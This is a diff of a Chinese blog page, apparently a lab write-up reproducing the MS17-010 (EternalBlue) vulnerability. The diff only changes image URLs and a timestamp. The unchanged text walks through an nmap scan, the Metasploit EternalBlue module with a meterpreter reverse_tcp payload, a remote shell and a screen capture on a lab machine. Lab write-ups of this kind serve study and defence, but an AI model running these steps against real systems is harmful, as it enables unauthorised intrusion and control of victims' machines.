@@ -17,18 +17,18 @@
 <meta property="og:site_name" content="Squidward的个人博客">
 <meta property="og:description" content="ms17_010（永恒之蓝）漏洞复习">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.squidward.xyz/img/blog/202104231.png">
-<meta property="og:image" content="https://www.squidward.xyz/img/blog/202104232.png">
-<meta property="og:image" content="https://www.squidward.xyz/img/blog/202104233.png">
-<meta property="og:image" content="https://www.squidward.xyz/img/blog/202104234.png">
-<meta property="og:image" content="https://www.squidward.xyz/img/blog/202104235.png">
-<meta property="og:image" content="https://www.squidward.xyz/img/blog/202104236.png">
+<meta property="og:image" content="https://brother-octopus.github.io/img/blog/202104231.png">
+<meta property="og:image" content="https://brother-octopus.github.io/img/blog/202104232.png">
+<meta property="og:image" content="https://brother-octopus.github.io/img/blog/202104233.png">
+<meta property="og:image" content="https://brother-octopus.github.io/img/blog/202104234.png">
+<meta property="og:image" content="https://brother-octopus.github.io/img/blog/202104235.png">
+<meta property="og:image" content="https://brother-octopus.github.io/img/blog/202104236.png">
 <meta property="article:published_time" content="2021-04-23T10:02:14.000Z">
-<meta property="article:modified_time" content="2021-04-24T03:35:44.041Z">
+<meta property="article:modified_time" content="2021-04-24T03:42:17.280Z">
 <meta property="article:author" content="Squidward">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.squidward.xyz/img/blog/202104231.png">
+<meta name="twitter:image" content="https://brother-octopus.github.io/img/blog/202104231.png">
   
     <link rel="alternative" href="/atom.xml" title="Squidward的个人博客" type="application/atom+xml">
   
@@ -265,19 +265,19 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.15.0&#x2F;24</span><br></pre></td></tr></table></figure>
 
 <p>扫描结果</p>
-<p><img src="https://www.squidward.xyz/img/blog/202104231.png" alt="Image text"></p>
+<p><img src="https://brother-octopus.github.io/img/blog/202104231.png" alt="Image text"></p>
 <p>可以看到445端口是开放的，那么极大概率可以通过ms17-010漏洞进行攻击。</p>
 <p>启动msf框架：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.squidward.xyz/img/blog/202104232.png" alt="Image text"></p>
+<p><img src="https://brother-octopus.github.io/img/blog/202104232.png" alt="Image text"></p>
 <p>搜索对应的ms17攻击模块：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; search ms17</span><br></pre></td></tr></table></figure>
 
 <p>使用该模块：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.squidward.xyz/img/blog/202104233.png" alt="Image text"></p>
+<p><img src="https://brother-octopus.github.io/img/blog/202104233.png" alt="Image text"></p>
 <p>输入过程可以用Tab键来补全模块名称</p>
 <p>显示所需要的的参数</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; show options</span><br></pre></td></tr></table></figure>
@@ -286,17 +286,17 @@
 <p>参数设置：</p>
 <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">15</span>.<span class="number">136</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">15</span>.<span class="number">135</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.squidward.xyz/img/blog/202104234.png" alt="Image text"></p>
+<p><img src="https://brother-octopus.github.io/img/blog/202104234.png" alt="Image text"></p>
 <p>其中的攻击载体，、简单来说就是，如果不使用这个模块，攻击成功之后，就是一个简单的shell，使用这个载体，攻击成功之后可以使用这个模块自带的各种攻击模块（非常强大）。</p>
 <p>最后开始攻击：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6&gt; run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.squidward.xyz/img/blog/202104235.png" alt="Image text"></p>
+<p><img src="https://brother-octopus.github.io/img/blog/202104235.png" alt="Image text"></p>
 <p>攻击成功，可以看到已经进入了meterpreter界面</p>
 <p>输入shell即可对目标靶机进行各种操作：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; shell</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://www.squidward.xyz/img/blog/202104236.png" alt="Image text"></p>
+<p><img src="https://brother-octopus.github.io/img/blog/202104236.png" alt="Image text"></p>
 <p>还可以进行很多很多的操作，这里列一个获取屏幕截图：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; screenshot</span><br></pre></td></tr></table></figure>
 
